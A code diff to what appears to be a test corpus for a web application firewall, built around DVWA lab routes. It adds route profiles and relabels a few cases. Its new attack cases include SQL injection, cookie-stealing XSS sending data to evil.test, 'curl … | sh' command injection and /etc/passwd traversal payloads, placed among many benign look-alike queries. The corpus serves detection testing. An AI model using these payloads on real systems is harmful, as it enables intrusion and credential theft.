@@ -11,7 +11,8 @@ require it.
 """
 from __future__ import annotations
 
-from dataclasses import dataclass, field
+import copy
+from dataclasses import dataclass, field, replace
 from typing import Any
 
 
@@ -28,7 +29,6 @@ class CorpusCase:
     crs_rule_ids: list[str]
     category: str
     headers: dict[str, str] = field(default_factory=dict)
-    application_context: dict[str, Any] = field(default_factory=dict)
     notes: str = ""
 
     @property
@@ -76,7 +76,6 @@ def _benign(
     matched: str,
     rules: list[str],
     category: str,
-    context: dict[str, Any],
     *,
     notes: str = "",
 ) -> CorpusCase:
@@ -91,7 +90,6 @@ def _benign(
         matched_data=matched,
         crs_rule_ids=rules,
         category=category,
-        application_context=context,
         notes=notes,
     )
 
@@ -101,6 +99,34 @@ def _route(path: str, methods: list[str], parameters: dict[str, str], purpose: s
         "application": {"purpose": purpose},
         "route": {"path": path, "methods": methods, "parameters": parameters},
     }
+
+
+# Operator-written route profiles. A case gets the profile of the route it hits,
+# whatever its label, so the profile itself never gives the answer away. Routes
+# missing here (such as /support and /bookmarks) have no profile, as in a lab
+# where the operator has not described every route yet.
+ROUTE_PROFILES: dict[str, dict[str, Any]] = {
+    profile["route"]["path"]: profile
+    for profile in (
+        _route("/catalog/search", ["GET"], {"q": "natural-language search terms"}, "product catalog search"),
+        _route("/customers", ["POST"], {"name": "customer display name"}, "customer directory"),
+        _route("/articles", ["POST"], {"body": "sanitized rich-text HTML"}, "CMS article editor"),
+        _route("/docs/search", ["POST"], {"q": "documentation search phrase"}, "documentation search"),
+        _route("/vulnerabilities/sqli/", ["GET"], {"id": "user id lookup"}, "DVWA SQL injection lab"),
+        _route("/vulnerabilities/sqli_blind/", ["GET"], {"id": "user id lookup"}, "DVWA blind SQL injection lab"),
+        _route("/vulnerabilities/xss_r/", ["GET"], {"name": "display name"}, "DVWA reflected XSS lab"),
+        _route("/vulnerabilities/xss_s/", ["POST"], {"txtName": "author name", "mtxMessage": "guestbook message"}, "DVWA guestbook"),
+        _route("/vulnerabilities/exec/", ["POST"], {"ip": "host to ping"}, "DVWA ping form"),
+        _route("/login.php", ["POST"], {"username": "account username", "password": "account password"}, "DVWA login"),
+        _route("/security.php", ["POST"], {"security": "DVWA security level"}, "DVWA security settings"),
+        _route("/vulnerabilities/fi/", ["GET"], {"page": "local content page name"}, "DVWA file include lab"),
+        _route("/index.php", ["GET"], {"theme": "ui theme cookie"}, "DVWA home"),
+    )
+}
+
+
+def route_profile(path: str) -> dict[str, Any]:
+    return copy.deepcopy(ROUTE_PROFILES.get(path, {}))
 
 
 def sqli_attacks() -> list[CorpusCase]:
@@ -333,6 +359,12 @@ def rfi_php_protocol_misc() -> list[CorpusCase]:
         elif slug == "header-overflow":
             headers = {"X-Overflow": "A" * 800}
             collection, parameter, matched = "REQUEST_HEADERS", "X-Overflow", "A" * 40
+        if slug == "host-ip":
+            # A numeric Host alone is a policy warning (health checks, browsing a lab by IP), not an exploit.
+            benign = _benign(slug, method, path, collection, parameter, payload, matched, rules, "protocol",
+                             notes="numeric Host header with no other signal")
+            cases.append(replace(benign, headers=headers))
+            continue
         cases.append(
             _attack(slug, method, path, collection, parameter, payload, matched, rules, "protocol", headers=headers)
         )
@@ -357,119 +389,131 @@ def rfi_php_protocol_misc() -> list[CorpusCase]:
     return cases
 
 
-def benign_cases() -> list[CorpusCase]:
-    search = _route("/catalog/search", ["GET"], {"q": "natural-language search terms"}, "product catalog search")
-    customers = _route("/customers", ["POST"], {"name": "customer display name"}, "customer directory")
-    articles = _route("/articles", ["POST"], {"body": "sanitized rich-text HTML"}, "CMS article editor")
-    docs = _route("/docs/search", ["POST"], {"q": "documentation search phrase"}, "documentation search")
-    support = _route("/support", ["POST"], {"message": "free-form support description"}, "support tickets")
-    bookmarks = _route("/bookmarks", ["POST"], {"url": "operator-reviewed bookmark URL"}, "bookmark manager")
-    sqli_lab = _route("/vulnerabilities/sqli/", ["GET"], {"id": "user id lookup"}, "DVWA SQL injection lab")
-    xss_r = _route("/vulnerabilities/xss_r/", ["GET"], {"name": "display name"}, "DVWA reflected XSS lab")
-    xss_s = _route("/vulnerabilities/xss_s/", ["POST"], {"txtName": "author name", "mtxMessage": "guestbook message"}, "DVWA guestbook")
-    exec_lab = _route("/vulnerabilities/exec/", ["POST"], {"ip": "host to ping"}, "DVWA ping form")
-    login = _route("/login.php", ["POST"], {"username": "account username", "password": "account password"}, "DVWA login")
-    security = _route("/security.php", ["POST"], {"security": "DVWA security level"}, "DVWA security settings")
-    fi_lab = _route("/vulnerabilities/fi/", ["GET"], {"page": "local content page name"}, "DVWA file include lab")
+def profiled_route_attacks() -> list[CorpusCase]:
+    """Attacks on routes whose profile calls the parameter free text or markup.
 
+    The profile alone must never be enough to clear a request.
+    """
+    a = _attack
+    return [
+        a("catalog-union", "GET", "/catalog/search", "ARGS", "q", "shoes' UNION SELECT username,password FROM users--", "UNION SELECT username,password FROM users", ["942100", "942190"], "sqli"),
+        a("catalog-script-cookie", "GET", "/catalog/search", "ARGS", "q", "<script>document.location='https://evil.test/?c='+document.cookie</script>", "<script>document.location=", ["941100"], "xss"),
+        a("customer-drop-table", "POST", "/customers", "ARGS", "name", "Robert'); DROP TABLE customers;--", "'); DROP TABLE customers;--", ["942100"], "sqli"),
+        a("customer-img-onerror", "POST", "/customers", "ARGS", "name", "<img src=x onerror=fetch('//evil.test/'+document.cookie)>", "onerror=fetch(", ["941100", "941120"], "xss"),
+        a("article-remote-script", "POST", "/articles", "ARGS", "body", '<p>Hi</p><script src="https://evil.test/x.js"></script>', '<script src="https://evil.test/x.js">', ["941110"], "xss"),
+        a("article-javascript-href", "POST", "/articles", "ARGS", "body", "<a href=\"javascript:fetch('//evil.test/'+document.cookie)\">help</a>", "javascript:fetch(", ["941170"], "xss"),
+        a("docs-cat-passwd", "POST", "/docs/search", "ARGS", "q", "tutorial; cat /etc/passwd", "; cat /etc/passwd", ["932100"], "rce"),
+        a("docs-curl-pipe-sh", "POST", "/docs/search", "ARGS", "q", "$(curl -s https://evil.test/x.sh | sh)", "$(curl -s https://evil.test/x.sh | sh)", ["932100", "932130"], "rce"),
+        a("guestbook-name-script", "POST", "/vulnerabilities/xss_s/", "ARGS", "txtName", "<script>new Image().src='//evil.test/'+document.cookie</script>", "<script>new Image()", ["941100"], "xss"),
+        a("security-level-sqli", "POST", "/security.php", "ARGS", "security", "low' OR 1=1--", "' OR 1=1--", ["942100"], "sqli"),
+        a("login-password-sqli", "POST", "/login.php", "ARGS", "password", "x' OR '1'='1", "' OR '1'='1", ["942100"], "sqli"),
+        a("fi-page-traversal", "GET", "/vulnerabilities/fi/", "ARGS", "page", "../../../../etc/passwd", "../../../../etc/passwd", ["930100", "930120"], "lfi"),
+    ]
+
+
+def benign_cases() -> list[CorpusCase]:
     rows: list[CorpusCase] = [
-        _benign("select-products", "GET", "/catalog/search", "ARGS", "q", "select all products from category shoes", "select all products from category shoes", ["942100"], "sqli", search),
-        _benign("drop-down", "GET", "/catalog/search", "ARGS", "q", "drop down menu navigation", "drop down menu navigation", ["942100"], "sqli", search),
-        _benign("union-size", "GET", "/catalog/search", "ARGS", "q", "union of size and colour filters", "union of size and colour filters", ["942100", "942190"], "sqli", search),
-        _benign("order-by-price", "GET", "/catalog/search", "ARGS", "q", "order by price then rating", "order by price then rating", ["942100"], "sqli", search),
-        _benign("from-warehouse", "GET", "/catalog/search", "ARGS", "q", "items from warehouse 12", "items from warehouse 12", ["942100"], "sqli", search),
-        _benign("and-or-connectors", "GET", "/catalog/search", "ARGS", "q", "red and blue or green sneakers", "red and blue or green sneakers", ["942130"], "sqli", search),
-        _benign("having-trouble", "POST", "/support", "ARGS", "message", "having trouble checking out after update", "having trouble checking out", ["942250"], "sqli", support),
-        _benign("insert-tab", "POST", "/docs/search", "ARGS", "q", "how to insert a tab in the editor", "insert a tab", ["942350"], "sqli", docs),
-        _benign("update-profile", "POST", "/docs/search", "ARGS", "q", "update your profile picture", "update your profile", ["942100"], "sqli", docs),
-        _benign("delete-draft", "POST", "/docs/search", "ARGS", "q", "delete draft articles from last week", "delete draft articles", ["942100"], "sqli", docs),
-        _benign("join-newsletter", "GET", "/catalog/search", "ARGS", "q", "join our newsletter for select deals", "join our newsletter for select deals", ["942100"], "sqli", search),
-        _benign("table-of-contents", "POST", "/docs/search", "ARGS", "q", "table of contents for the sql tutorial", "table of contents for the sql tutorial", ["942140"], "sqli", docs),
-        _benign("where-is-order", "POST", "/support", "ARGS", "message", "where is my order from last Friday", "where is my order", ["942100"], "sqli", support),
-        _benign("limit-results", "GET", "/catalog/search", "ARGS", "q", "limit results to in-stock only", "limit results to in-stock only", ["942100"], "sqli", search),
-        _benign("count-inventory", "GET", "/catalog/search", "ARGS", "q", "count inventory by warehouse", "count inventory by warehouse", ["942100"], "sqli", search),
-        _benign("sleep-mode", "POST", "/docs/search", "ARGS", "q", "how to enable sleep mode on linux", "sleep mode on linux", ["942160"], "sqli", docs),
-        _benign("benchmark-guide", "POST", "/docs/search", "ARGS", "q", "benchmark your queries in the tutorial", "benchmark your queries", ["942170"], "sqli", docs),
-        _benign("information-schema", "POST", "/docs/search", "ARGS", "q", "what is information_schema in postgres docs", "information_schema in postgres docs", ["942140"], "sqli", docs),
-        _benign("apostrophe-oreilly", "POST", "/customers", "ARGS", "name", "O'Reilly", "O'Reilly", ["942100"], "sqli", customers),
-        _benign("apostrophe-dario", "POST", "/customers", "ARGS", "name", "D'Angelo", "D'Angelo", ["942100"], "sqli", customers),
-        _benign("apostrophe-shannon", "POST", "/customers", "ARGS", "name", "O'Shaughnessy", "O'Shaughnessy", ["942100"], "sqli", customers),
-        _benign("apostrophe-loreal", "POST", "/customers", "ARGS", "name", "L'Oréal Paris store account", "L'Oréal", ["942100"], "sqli", customers),
-        _benign("html-em", "POST", "/articles", "ARGS", "body", "<em>important</em>", "<em>important</em>", ["941100"], "xss", articles),
-        _benign("html-strong", "POST", "/articles", "ARGS", "body", "This is <strong>great</strong> work.", "<strong>great</strong>", ["941100"], "xss", articles),
-        _benign("html-p", "POST", "/articles", "ARGS", "body", "<p>Hello team, please review.</p>", "<p>Hello team", ["941160"], "xss", articles),
-        _benign("html-br", "POST", "/articles", "ARGS", "body", "line one<br>line two", "<br>", ["941160"], "xss", articles),
-        _benign("markdown-bold", "POST", "/vulnerabilities/xss_s/", "ARGS", "mtxMessage", "This is **great**. I love the design of the guestbook.", "**great**", ["941100"], "xss", xss_s),
-        _benign("xssr-emphasis", "GET", "/vulnerabilities/xss_r/", "ARGS", "name", "I love the <em>design</em> and **bold** text", "<em>design</em>", ["941100"], "xss", xss_r),
-        _benign("blockquote", "POST", "/articles", "ARGS", "body", "<blockquote>Quoted from style guide</blockquote>", "<blockquote>", ["941160"], "xss", articles),
-        _benign("href-https", "POST", "/articles", "ARGS", "body", '<a href="https://example.test/help">help</a>', 'href="https://example.test/help"', ["941140"], "xss", articles),
-        _benign("img-static", "POST", "/articles", "ARGS", "body", '<img src="/static/logo.png" alt="logo">', '<img src="/static/logo.png"', ["941100"], "xss", articles),
-        _benign("code-span", "POST", "/articles", "ARGS", "body", "Use <code>alert</code> only in the docs example.", "<code>alert</code>", ["941110"], "xss", articles),
-        _benign("shell-echo", "POST", "/docs/search", "ARGS", "q", "how to use echo in bash", "how to use echo in bash", ["932100"], "rce", docs),
-        _benign("shell-ls", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "Run ls -la to list files in the tutorial; do not execute it.", "ls -la to list files", ["932100"], "rce", exec_lab),
-        _benign("shell-cat", "POST", "/docs/search", "ARGS", "q", "cat file contents in the unix tutorial", "cat file contents", ["932100"], "rce", docs),
-        _benign("shell-pipe-docs", "POST", "/docs/search", "ARGS", "q", "pipe grep output to less in the handbook", "pipe grep output to less", ["932110"], "rce", docs),
-        _benign("shell-whoami-docs", "POST", "/docs/search", "ARGS", "q", "what does whoami print on ubuntu", "whoami print on ubuntu", ["932105"], "rce", docs),
-        _benign("ip-literal", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "127.0.0.1", "127.0.0.1", ["932100"], "rce", exec_lab),
-        _benign("hostname", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "localhost", "localhost", ["932100"], "rce", exec_lab),
-        _benign("windows-path", "POST", "/support", "ARGS", "message", r"C:\Users\Public\report.txt", r"C:\Users\Public\report.txt", ["930100"], "lfi", support),
-        _benign("windows-docs", "POST", "/support", "ARGS", "message", r"See C:\Program Files\App\readme.txt", r"C:\Program Files\App\readme.txt", ["930100"], "lfi", support),
-        _benign("unix-home-docs", "POST", "/support", "ARGS", "message", "config lives in /home/amish/projects/notes.txt", "/home/amish/projects/notes.txt", ["930120"], "lfi", support),
-        _benign("relative-url", "POST", "/bookmarks", "ARGS", "url", "https://example.test/a/../b", "https://example.test/a/../b", ["931130", "930110"], "rfi", bookmarks),
-        _benign("docs-parent-path", "POST", "/docs/search", "ARGS", "q", "what does ../ mean in a url path", "../ mean in a url path", ["930100"], "lfi", docs),
-        _benign("etc-passwd-docs", "POST", "/docs/search", "ARGS", "q", "why attackers request /etc/passwd in tutorials", "/etc/passwd in tutorials", ["930120"], "lfi", docs),
-        _benign("login-special-password", "POST", "/login.php", "ARGS", "password", r"P@ssw0rd!#$", r"P@ssw0rd!#$", ["942100"], "sqli", login),
-        _benign("login-admin-user", "POST", "/login.php", "ARGS", "username", "admin", "admin", ["942100"], "sqli", login),
-        _benign("security-low", "POST", "/security.php", "ARGS", "security", "low", "low", ["920273"], "protocol", security),
-        _benign("fi-include-home", "GET", "/vulnerabilities/fi/", "ARGS", "page", "include.php", "include.php", ["930120"], "lfi", fi_lab),
-        _benign("guestbook-name", "POST", "/vulnerabilities/xss_s/", "ARGS", "txtName", "reviewer", "reviewer", ["941100"], "xss", xss_s),
-        _benign("sqli-lab-numeric", "GET", "/vulnerabilities/sqli/", "ARGS", "id", "1", "1", ["942100"], "sqli", sqli_lab),
-        _benign("json-select-key", "POST", "/articles", "ARGS", "body", '{"title":"select committee minutes"}', "select committee minutes", ["942100"], "sqli", articles),
-        _benign("css-expression-docs", "POST", "/docs/search", "ARGS", "q", "css expression() is deprecated in ie docs", "css expression()", ["941160"], "xss", docs),
-        _benign("alert-docs", "POST", "/docs/search", "ARGS", "q", "javascript alert dialog in the style guide", "javascript alert dialog", ["941110"], "xss", docs),
-        _benign("onerror-docs", "POST", "/docs/search", "ARGS", "q", "img onerror handler explained for students", "img onerror handler explained", ["941120"], "xss", docs),
-        _benign("union-station", "GET", "/catalog/search", "ARGS", "q", "union station tote bag", "union station tote bag", ["942190"], "sqli", search),
-        _benign("select-committee", "GET", "/catalog/search", "ARGS", "q", "select committee report hardcover", "select committee report hardcover", ["942100"], "sqli", search),
-        _benign("drop-earrings", "GET", "/catalog/search", "ARGS", "q", "drop earrings gold plated", "drop earrings gold plated", ["942360"], "sqli", search),
-        _benign("exec-summary", "POST", "/docs/search", "ARGS", "q", "executive summary template", "executive summary template", ["932150"], "rce", docs),
-        _benign("cmd-palette", "POST", "/docs/search", "ARGS", "q", "open the command palette with ctrl shift p", "command palette", ["932110"], "rce", docs),
-        _benign("null-chapter", "POST", "/docs/search", "ARGS", "q", "chapter 0: null values in sql", "null values in sql", ["920270"], "protocol", docs),
-        _benign("percent-encoding-docs", "POST", "/docs/search", "ARGS", "q", "why urls use %2f for slashes", "%2f for slashes", ["930110"], "lfi", docs),
-        _benign("localhost-docs", "POST", "/docs/search", "ARGS", "q", "bind the server to localhost during development", "localhost during development", ["920350"], "protocol", docs),
-        _benign("user-agent-chrome", "GET", "/index.php", "REQUEST_HEADERS", "User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/128.0.0.0", "Mozilla/5.0", ["913100"], "scanner", _route("/index.php", ["GET"], {}, "DVWA home"), notes="ordinary browser UA"),
-        _benign("json-ampersand", "POST", "/customers", "ARGS", "name", "Smith & Jones LLC", "Smith & Jones LLC", ["942100"], "sqli", customers),
-        _benign("email-plus", "POST", "/customers", "ARGS", "name", "Ada Lovelace", "Ada Lovelace", ["942100"], "sqli", customers),
-        _benign("version-sql", "POST", "/docs/search", "ARGS", "q", "postgresql version() function in the manual", "version() function in the manual", ["942100"], "sqli", docs),
-        _benign("wait-for-docs", "POST", "/docs/search", "ARGS", "q", "wait for delay in the deployment runbook", "wait for delay in the deployment runbook", ["942160"], "sqli", docs),
-        _benign("passwd-phrase", "POST", "/support", "ARGS", "message", "please reset the password on my account", "reset the password on my account", ["930120"], "lfi", support),
-        _benign("script-kiddie-docs", "POST", "/docs/search", "ARGS", "q", "history of the script tag in html4", "script tag in html4", ["941110"], "xss", docs),
-        _benign("svg-logo", "POST", "/articles", "ARGS", "body", '<img src="/brand.svg" alt="brand">', "/brand.svg", ["941110"], "xss", articles),
-        _benign("confirm-attendance", "POST", "/support", "ARGS", "message", "please confirm attendance for Friday", "confirm attendance", ["941110"], "xss", support),
-        _benign("eval-coursework", "POST", "/docs/search", "ARGS", "q", "teacher eval form for the coursework", "teacher eval form", ["933150"], "php", docs),
-        _benign("include-header", "POST", "/docs/search", "ARGS", "q", "include a header on every page of the report", "include a header on every page", ["933130"], "php", docs),
-        _benign("system-design", "POST", "/docs/search", "ARGS", "q", "system design interview notes", "system design interview notes", ["933150"], "php", docs),
-        _benign("file-include-readme", "GET", "/vulnerabilities/fi/", "ARGS", "page", "readme", "readme", ["930120"], "lfi", fi_lab),
-        _benign("ping-hostname-docs", "POST", "/docs/search", "ARGS", "q", "ping hostname to check dns in the runbook", "ping hostname to check dns", ["932100"], "rce", docs),
-        _benign("or-conjunction", "GET", "/catalog/search", "ARGS", "q", "cotton or linen shirts", "cotton or linen shirts", ["942130"], "sqli", search),
-        _benign("in-stock", "GET", "/catalog/search", "ARGS", "q", "in stock navy jacket", "in stock navy jacket", ["942100"], "sqli", search),
-        _benign("like-this", "GET", "/catalog/search", "ARGS", "q", "more items like this tote", "like this tote", ["942100"], "sqli", search),
-        _benign("between-sizes", "GET", "/catalog/search", "ARGS", "q", "shoes between size 8 and 10", "between size 8 and 10", ["942100"], "sqli", search),
-        _benign("not-null-docs", "POST", "/docs/search", "ARGS", "q", "not null constraint in the sql primer", "not null constraint", ["942100"], "sqli", docs),
-        _benign("create-account-copy", "POST", "/articles", "ARGS", "body", "<p>Create your account to continue.</p>", "Create your account", ["941160"], "xss", articles),
-        _benign("bash-tutorial-and", "POST", "/docs/search", "ARGS", "q", "using && in bash to chain commands in the tutorial", "&& in bash to chain commands", ["932100"], "rce", docs),
-        _benign("backslash-windows-docs", "POST", "/support", "ARGS", "message", r"path uses backslash like C:\Temp\out.csv", r"C:\Temp\out.csv", ["930100"], "lfi", support),
-        _benign("dotdot-explanation", "POST", "/docs/search", "ARGS", "q", "relative paths may contain .. segments when normalizing", ".. segments when normalizing", ["930100"], "lfi", docs),
-        _benign("http-example-url", "POST", "/bookmarks", "ARGS", "url", "https://example.test/docs/sql/select.html", "https://example.test/docs/sql/select.html", ["931130", "942100"], "rfi", bookmarks),
-        _benign("cookie-theme", "GET", "/index.php", "REQUEST_COOKIES", "theme", "dark", "dark", ["942100"], "sqli", _route("/index.php", ["GET"], {"theme": "ui theme cookie"}, "DVWA home")),
-        _benign("q-select-course", "GET", "/catalog/search", "ARGS", "q", "select course notebook", "select course notebook", ["942100"], "sqli", search),
-        _benign("union-made", "GET", "/catalog/search", "ARGS", "q", "union made denim jacket", "union made denim jacket", ["942190"], "sqli", search),
-        _benign("exec-board", "POST", "/docs/search", "ARGS", "q", "exec board meeting minutes", "exec board meeting minutes", ["932150"], "rce", docs),
-        _benign("id-parameter-name", "GET", "/catalog/search", "ARGS", "q", "product id labels for the warehouse", "product id labels", ["932105"], "rce", search),
-        _benign("passwd-reset-ticket", "POST", "/support", "ARGS", "message", "passwd reset completed for the finance user", "passwd reset completed", ["930120"], "lfi", support),
-        _benign("xml-update-docs", "POST", "/docs/search", "ARGS", "q", "how to update xml invoices in the handbook", "update xml invoices", ["942100"], "sqli", docs),
-        _benign("concat-names", "POST", "/customers", "ARGS", "name", "Mary-Jane O'Connor-Smith", "O'Connor-Smith", ["942100"], "sqli", customers),
-        _benign("html-ul", "POST", "/articles", "ARGS", "body", "<ul><li>first</li><li>second</li></ul>", "<ul><li>first</li>", ["941160"], "xss", articles),
-        _benign("dvwa-login-get", "GET", "/login.php", "ARGS", "username", "", "", ["920300"], "protocol", login),
+        _benign("select-products", "GET", "/catalog/search", "ARGS", "q", "select all products from category shoes", "select all products from category shoes", ["942100"], "sqli"),
+        _benign("drop-down", "GET", "/catalog/search", "ARGS", "q", "drop down menu navigation", "drop down menu navigation", ["942100"], "sqli"),
+        _benign("union-size", "GET", "/catalog/search", "ARGS", "q", "union of size and colour filters", "union of size and colour filters", ["942100", "942190"], "sqli"),
+        _benign("order-by-price", "GET", "/catalog/search", "ARGS", "q", "order by price then rating", "order by price then rating", ["942100"], "sqli"),
+        _benign("from-warehouse", "GET", "/catalog/search", "ARGS", "q", "items from warehouse 12", "items from warehouse 12", ["942100"], "sqli"),
+        _benign("and-or-connectors", "GET", "/catalog/search", "ARGS", "q", "red and blue or green sneakers", "red and blue or green sneakers", ["942130"], "sqli"),
+        _benign("having-trouble", "POST", "/support", "ARGS", "message", "having trouble checking out after update", "having trouble checking out", ["942250"], "sqli"),
+        _benign("insert-tab", "POST", "/docs/search", "ARGS", "q", "how to insert a tab in the editor", "insert a tab", ["942350"], "sqli"),
+        _benign("update-profile", "POST", "/docs/search", "ARGS", "q", "update your profile picture", "update your profile", ["942100"], "sqli"),
+        _benign("delete-draft", "POST", "/docs/search", "ARGS", "q", "delete draft articles from last week", "delete draft articles", ["942100"], "sqli"),
+        _benign("join-newsletter", "GET", "/catalog/search", "ARGS", "q", "join our newsletter for select deals", "join our newsletter for select deals", ["942100"], "sqli"),
+        _benign("table-of-contents", "POST", "/docs/search", "ARGS", "q", "table of contents for the sql tutorial", "table of contents for the sql tutorial", ["942140"], "sqli"),
+        _benign("where-is-order", "POST", "/support", "ARGS", "message", "where is my order from last Friday", "where is my order", ["942100"], "sqli"),
+        _benign("limit-results", "GET", "/catalog/search", "ARGS", "q", "limit results to in-stock only", "limit results to in-stock only", ["942100"], "sqli"),
+        _benign("count-inventory", "GET", "/catalog/search", "ARGS", "q", "count inventory by warehouse", "count inventory by warehouse", ["942100"], "sqli"),
+        _benign("sleep-mode", "POST", "/docs/search", "ARGS", "q", "how to enable sleep mode on linux", "sleep mode on linux", ["942160"], "sqli"),
+        _benign("benchmark-guide", "POST", "/docs/search", "ARGS", "q", "benchmark your queries in the tutorial", "benchmark your queries", ["942170"], "sqli"),
+        _benign("information-schema", "POST", "/docs/search", "ARGS", "q", "what is information_schema in postgres docs", "information_schema in postgres docs", ["942140"], "sqli"),
+        _benign("apostrophe-oreilly", "POST", "/customers", "ARGS", "name", "O'Reilly", "O'Reilly", ["942100"], "sqli"),
+        _benign("apostrophe-dario", "POST", "/customers", "ARGS", "name", "D'Angelo", "D'Angelo", ["942100"], "sqli"),
+        _benign("apostrophe-shannon", "POST", "/customers", "ARGS", "name", "O'Shaughnessy", "O'Shaughnessy", ["942100"], "sqli"),
+        _benign("apostrophe-loreal", "POST", "/customers", "ARGS", "name", "L'Oréal Paris store account", "L'Oréal", ["942100"], "sqli"),
+        _benign("html-em", "POST", "/articles", "ARGS", "body", "<em>important</em>", "<em>important</em>", ["941100"], "xss"),
+        _benign("html-strong", "POST", "/articles", "ARGS", "body", "This is <strong>great</strong> work.", "<strong>great</strong>", ["941100"], "xss"),
+        _benign("html-p", "POST", "/articles", "ARGS", "body", "<p>Hello team, please review.</p>", "<p>Hello team", ["941160"], "xss"),
+        _benign("html-br", "POST", "/articles", "ARGS", "body", "line one<br>line two", "<br>", ["941160"], "xss"),
+        _benign("markdown-bold", "POST", "/vulnerabilities/xss_s/", "ARGS", "mtxMessage", "This is **great**. I love the design of the guestbook.", "**great**", ["941100"], "xss"),
+        _benign("xssr-emphasis", "GET", "/vulnerabilities/xss_r/", "ARGS", "name", "I love the <em>design</em> and **bold** text", "<em>design</em>", ["941100"], "xss"),
+        _benign("blockquote", "POST", "/articles", "ARGS", "body", "<blockquote>Quoted from style guide</blockquote>", "<blockquote>", ["941160"], "xss"),
+        _benign("href-https", "POST", "/articles", "ARGS", "body", '<a href="https://example.test/help">help</a>', 'href="https://example.test/help"', ["941140"], "xss"),
+        _benign("img-static", "POST", "/articles", "ARGS", "body", '<img src="/static/logo.png" alt="logo">', '<img src="/static/logo.png"', ["941100"], "xss"),
+        _benign("code-span", "POST", "/articles", "ARGS", "body", "Use <code>alert</code> only in the docs example.", "<code>alert</code>", ["941110"], "xss"),
+        _benign("shell-echo", "POST", "/docs/search", "ARGS", "q", "how to use echo in bash", "how to use echo in bash", ["932100"], "rce"),
+        _attack("shell-ls-in-ping-host", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "Run ls -la to list files in the tutorial; do not execute it.", "ls -la to list files", ["932100"], "rce"),
+        _benign("shell-cat", "POST", "/docs/search", "ARGS", "q", "cat file contents in the unix tutorial", "cat file contents", ["932100"], "rce"),
+        _benign("shell-pipe-docs", "POST", "/docs/search", "ARGS", "q", "pipe grep output to less in the handbook", "pipe grep output to less", ["932110"], "rce"),
+        _benign("shell-whoami-docs", "POST", "/docs/search", "ARGS", "q", "what does whoami print on ubuntu", "whoami print on ubuntu", ["932105"], "rce"),
+        _benign("ip-literal", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "127.0.0.1", "127.0.0.1", ["932100"], "rce"),
+        _benign("hostname", "POST", "/vulnerabilities/exec/", "ARGS", "ip", "localhost", "localhost", ["932100"], "rce"),
+        _benign("windows-path", "POST", "/support", "ARGS", "message", r"C:\Users\Public\report.txt", r"C:\Users\Public\report.txt", ["930100"], "lfi"),
+        _benign("windows-docs", "POST", "/support", "ARGS", "message", r"See C:\Program Files\App\readme.txt", r"C:\Program Files\App\readme.txt", ["930100"], "lfi"),
+        _benign("unix-home-docs", "POST", "/support", "ARGS", "message", "config lives in /home/amish/projects/notes.txt", "/home/amish/projects/notes.txt", ["930120"], "lfi"),
+        _benign("relative-url", "POST", "/bookmarks", "ARGS", "url", "https://example.test/a/../b", "https://example.test/a/../b", ["931130", "930110"], "rfi"),
+        _benign("docs-parent-path", "POST", "/docs/search", "ARGS", "q", "what does ../ mean in a url path", "../ mean in a url path", ["930100"], "lfi"),
+        _benign("etc-passwd-docs", "POST", "/docs/search", "ARGS", "q", "why attackers request /etc/passwd in tutorials", "/etc/passwd in tutorials", ["930120"], "lfi"),
+        _benign("login-special-password", "POST", "/login.php", "ARGS", "password", r"P@ssw0rd!#$", r"P@ssw0rd!#$", ["942100"], "sqli"),
+        _benign("login-admin-user", "POST", "/login.php", "ARGS", "username", "admin", "admin", ["942100"], "sqli"),
+        _benign("security-low", "POST", "/security.php", "ARGS", "security", "low", "low", ["920273"], "protocol"),
+        _benign("fi-include-home", "GET", "/vulnerabilities/fi/", "ARGS", "page", "include.php", "include.php", ["930120"], "lfi"),
+        _benign("guestbook-name", "POST", "/vulnerabilities/xss_s/", "ARGS", "txtName", "reviewer", "reviewer", ["941100"], "xss"),
+        _benign("sqli-lab-numeric", "GET", "/vulnerabilities/sqli/", "ARGS", "id", "1", "1", ["942100"], "sqli"),
+        _benign("json-select-key", "POST", "/articles", "ARGS", "body", '{"title":"select committee minutes"}', "select committee minutes", ["942100"], "sqli"),
+        _benign("css-expression-docs", "POST", "/docs/search", "ARGS", "q", "css expression() is deprecated in ie docs", "css expression()", ["941160"], "xss"),
+        _benign("alert-docs", "POST", "/docs/search", "ARGS", "q", "javascript alert dialog in the style guide", "javascript alert dialog", ["941110"], "xss"),
+        _benign("onerror-docs", "POST", "/docs/search", "ARGS", "q", "img onerror handler explained for students", "img onerror handler explained", ["941120"], "xss"),
+        _benign("union-station", "GET", "/catalog/search", "ARGS", "q", "union station tote bag", "union station tote bag", ["942190"], "sqli"),
+        _benign("select-committee", "GET", "/catalog/search", "ARGS", "q", "select committee report hardcover", "select committee report hardcover", ["942100"], "sqli"),
+        _benign("drop-earrings", "GET", "/catalog/search", "ARGS", "q", "drop earrings gold plated", "drop earrings gold plated", ["942360"], "sqli"),
+        _benign("exec-summary", "POST", "/docs/search", "ARGS", "q", "executive summary template", "executive summary template", ["932150"], "rce"),
+        _benign("cmd-palette", "POST", "/docs/search", "ARGS", "q", "open the command palette with ctrl shift p", "command palette", ["932110"], "rce"),
+        _benign("null-chapter", "POST", "/docs/search", "ARGS", "q", "chapter 0: null values in sql", "null values in sql", ["920270"], "protocol"),
+        _benign("percent-encoding-docs", "POST", "/docs/search", "ARGS", "q", "why urls use %2f for slashes", "%2f for slashes", ["930110"], "lfi"),
+        _benign("localhost-docs", "POST", "/docs/search", "ARGS", "q", "bind the server to localhost during development", "localhost during development", ["920350"], "protocol"),
+        _benign("user-agent-chrome", "GET", "/index.php", "REQUEST_HEADERS", "User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/128.0.0.0", "Mozilla/5.0", ["913100"], "scanner", notes="ordinary browser UA"),
+        _benign("json-ampersand", "POST", "/customers", "ARGS", "name", "Smith & Jones LLC", "Smith & Jones LLC", ["942100"], "sqli"),
+        _benign("email-plus", "POST", "/customers", "ARGS", "name", "Ada Lovelace", "Ada Lovelace", ["942100"], "sqli"),
+        _benign("version-sql", "POST", "/docs/search", "ARGS", "q", "postgresql version() function in the manual", "version() function in the manual", ["942100"], "sqli"),
+        _benign("wait-for-docs", "POST", "/docs/search", "ARGS", "q", "wait for delay in the deployment runbook", "wait for delay in the deployment runbook", ["942160"], "sqli"),
+        _benign("passwd-phrase", "POST", "/support", "ARGS", "message", "please reset the password on my account", "reset the password on my account", ["930120"], "lfi"),
